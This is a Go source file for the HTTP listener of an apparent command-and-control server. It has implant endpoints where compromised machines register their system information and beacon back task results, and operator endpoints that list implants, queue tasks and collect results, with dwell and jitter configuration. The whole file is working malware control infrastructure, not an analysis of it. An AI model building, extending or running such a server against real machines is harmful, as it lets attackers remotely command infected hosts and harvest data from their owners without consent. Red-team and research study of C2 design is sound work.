package main

import (
	"net/http"
	"strconv"

	"github.com/gin-gonic/gin"
	"gorm.io/gorm"
)

type HTTPSListener struct {
	db *gorm.DB
}

func (l *HTTPSListener) listen() {
	router := gin.Default()

	// Implant endpoints
	implant := router.Group("/implant")
	implant.POST("/register", l.Register)
	implant.POST("/beacon", l.Beacon)

	// Operator endpoints
	operator := router.Group("/operator")
	operator.GET("/implants", l.ListImplants)
	operator.GET("/implant/:id", l.GetImplant)
	operator.GET("/tasks/:implant-id", l.ListTasks)
	operator.GET("/tasks/:implant-id/:task-id", l.GetTask)
	operator.POST("/tasks/:implant-id", l.AddTasks)
	operator.GET("/results/:implant-id", l.ListResults)

	// router.RunTLS(":443", "./tls.crt", "./tls.key") // TODO: cert + key paths should not be hardcoded
	router.Run(":80")
}

func (l *HTTPSListener) Register(c *gin.Context) {
	var sysInfo SystemInfo
	if err := c.ShouldBindJSON(&sysInfo); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	// Create Implant
	implant := &Implant{
		SystemInfo:   sysInfo,
		Dwell:        "30s",
		Jitter:       0,
		CommProtocol: DEFAULT_IMPLANT_COMM_PROTOCOL,
	}

	if err := l.db.Create(implant).Error; err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	c.JSON(http.StatusCreated, gin.H{
		"id":            implant.ID,
		"comm_protocol": implant.CommProtocol.String(),
		"config": gin.H{
			"dwell":  implant.Dwell,
			"jitter": implant.Jitter,
		},
	})
}

type BeaconRequest struct {
	ImplantID uint     `json:"implant-id"`
	Results   []Result `json:"results"`
}

func (l *HTTPSListener) Beacon(c *gin.Context) {
	var req BeaconRequest
	if err := c.ShouldBind(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
	}

	// 1) Store results and mark tasks completed
	// TODO: if there is an errored task, it should still mark it as complete - rn its just skipping it and itll always get sent bc of its not getting back an errored result
	for _, res := range req.Results {
		var task Task
		if err := l.db.
			Where("id = ? AND implant_id = ?", res.TaskID, req.ImplantID).
			First(&task).Error; err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
			return
		}

		// append the result
		if err := l.db.Model(&task).Association("Results").Append(&res); err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
			return
		}
		// mark completed
		if err := l.db.Model(&task).Update("completed", true).Error; err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
			return
		}
	}

	// 2) Fetch all pending tasks for this implant
	var newTasks []Task
	if err := l.db.
		Where("implant_id = ? AND completed = false", req.ImplantID).
		Find(&newTasks).Error; err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	c.JSON(http.StatusOK, newTasks)
}

func (l *HTTPSListener) ListImplants(c *gin.Context) {
	var implants []Implant
	if err := l.db.Preload("Tasks").Preload("Tasks.Results").Find(&implants).Error; err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	c.JSON(http.StatusOK, gin.H{"implants": implants})
}

func (l *HTTPSListener) GetImplant(c *gin.Context) {
	id := c.Param("id")
	var implant Implant
	if err := l.db.Preload("Tasks").Preload("Tasks.Results").First(&implant, id).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "implant not found"})
		return
	}
	c.JSON(http.StatusOK, gin.H{"implant": implant})
}
func (l *HTTPSListener) ListTasks(c *gin.Context) {
	id := c.Param("implant-id")
	var tasks []Task
	if err := l.db.Where("implant_id = ?", id).Preload("Results").Find(&tasks).Error; err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	c.JSON(http.StatusOK, gin.H{"tasks": tasks})
}

func (l *HTTPSListener) GetTask(c *gin.Context) {
	// pull both params
	impIDStr := c.Param("implant-id")
	taskIDStr := c.Param("task-id")

	// TODO: update everything else to parse to uint64?
	// parse to uint64
	impID, err := strconv.ParseUint(impIDStr, 10, 64)
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid implant ID"})
		return
	}
	taskID, err := strconv.ParseUint(taskIDStr, 10, 64)
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid task ID"})
		return
	}

	// fetch only if it belongs to that implant
	var task Task
	if err = l.db.
		Where("id = ? AND implant_id = ?", taskID, impID).Preload("Results").
		First(&task).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "task not found"})
		return
	}

	c.JSON(http.StatusOK, gin.H{"task": task})
}

func (l *HTTPSListener) AddTasks(c *gin.Context) {
	id := c.Param("implant-id")
	var implant Implant
	if err := l.db.
		Preload("Tasks").
		First(&implant, id).
		Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "implant not found"})
		return
	}
	var newTasks []Task
	if err := c.ShouldBindJSON(&newTasks); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	for i := range newTasks {
		newTasks[i].ImplantID = implant.ID
	}
	if err := l.db.Create(&newTasks).Error; err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	if err := l.db.Model(&implant).Association("Tasks").Append(newTasks); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	c.JSON(http.StatusCreated, newTasks)
}

func (l *HTTPSListener) ListResults(c *gin.Context) {
	id := c.Param("implant-id")

	// get all tasks for implant
	var tasks []Task
	if err := l.db.
		Preload("Results").
		Where("implant_id = ?", id).
		Find(&tasks).Error; err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	// collect results
	var results []Result
	for _, t := range tasks {
		results = append(results, t.Results...)
	}
	c.JSON(http.StatusOK, gin.H{"results": results})
}
